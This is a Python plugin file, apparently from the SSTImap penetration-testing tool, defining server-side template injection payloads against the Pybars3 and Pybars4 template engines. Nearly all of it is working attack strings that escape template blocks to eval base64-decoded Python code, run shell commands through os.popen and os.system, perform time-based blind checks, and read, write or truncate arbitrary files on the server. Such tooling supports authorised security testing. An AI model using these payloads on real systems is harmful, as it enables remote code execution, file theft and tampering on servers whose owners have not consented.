from plugins.languages import python
from utils import rand


class Pybars3(python.Python):
    legacy_plugin = True
    formatter = "sstimap"
    priority = 7
    plugin_info = {
        "Description": """Pybars3 and Pybars4 template engines""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Original SSTImap payload
        ],
        "References": [
            "Advisory: https://github.com/vladko312/advisories/blob/702e98db9642ece70d9e2150076d8014ffec2db3/pybars3.md",
        ],
        "Engine": [
            "Pybars3 Github: https://github.com/wbond/pybars3",
            "Pybars4 Github: https://github.com/up9inc/pybars4",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': 'SSTIMAP:code;',
                'header': "{{#with ['+str(result.append(str(SSTIMAP:header:get,0;+SSTIMAP:header:get,1;)+str(",
                'trailer': ")+str(SSTIMAP:trailer:get,0;+SSTIMAP:trailer:get,1;)))+']}}{{/with}}",
                'test_render': f"'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'render_error': {
                'render': 'SSTIMAP:code;',
                'header': "{{#with ['+getattr('',str(SSTIMAP:header:get,0;+SSTIMAP:header:get,1;)+str(",
                'trailer': ")+str(SSTIMAP:trailer:get,0;+SSTIMAP:trailer:get,1;))+']}}{{/with}}",
                'test_render': f"'{rand.randstrings[0]}'.join('{rand.randstrings[1]}')",
                'test_render_expected': f'{rand.randstrings[0].join(rand.randstrings[1])}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())"""
            },
            'evaluate_error': {
                'evaluate': """eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{#with ['+str(result.append(str(1/bool(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())))))+']}}{{/with}}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """{{#with ['+str(eval(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()) and __import__('time').sleep(SSTIMAP:delay;))+']}}{{/with}}"""
            },
            'execute': {
                'call': 'render',
                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()).read()"""
            },
            'execute_error': {
                'call': 'render',
                'execute': """__import__('os').popen(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode()).read()"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """{{#with ['+str(result.append(str(1/(__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())==0))))+']}}{{/with}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{#with ['+str(__import__('os').system(__import__('base64').urlsafe_b64decode('SSTIMAP:code:b64u;').decode())==0 and __import__('time').sleep(SSTIMAP:delay;))+']}}{{/with}}"""
            },
            'write': {
                'call': 'inject',
                'write': """{{#with ['+str(open("SSTIMAP:path;", 'ab+').write(__import__("base64").urlsafe_b64decode('SSTIMAP:chunk:b64u;')))+']}}{{/with}}""",
                'truncate': """{{#with ['+str(open("SSTIMAP:path;", 'w').close())+']}}{{/with}}"""
            },
            'read': {
                'call': 'inject',
                'read': """{{#with ['+str(result.append(str(__import__("base64").b64encode(open("SSTIMAP:path;", "rb").read()))))+']}}{{/with}}"""
            },
            'md5': {
                'call': 'inject',
                'md5': """{{#with ['+str(result.append(str(__import__("hashlib").md5(open("SSTIMAP:path;", 'rb').read()).hexdigest())))+']}}{{/with}}"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': '''__import__("hashlib").md5(open("SSTIMAP:path;", 'rb').read()).hexdigest()=="SSTIMAP:md5;"''',
                'exists_blind': '''__import__("os").path.isfile("SSTIMAP:path;")'''
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # Normal reflecting tag {{ }}
            {'level': 1, 'prefix': 'SSTIMAP:closure;}}', 'suffix': '{{', 'closures': python.ctx_closures},
        ])
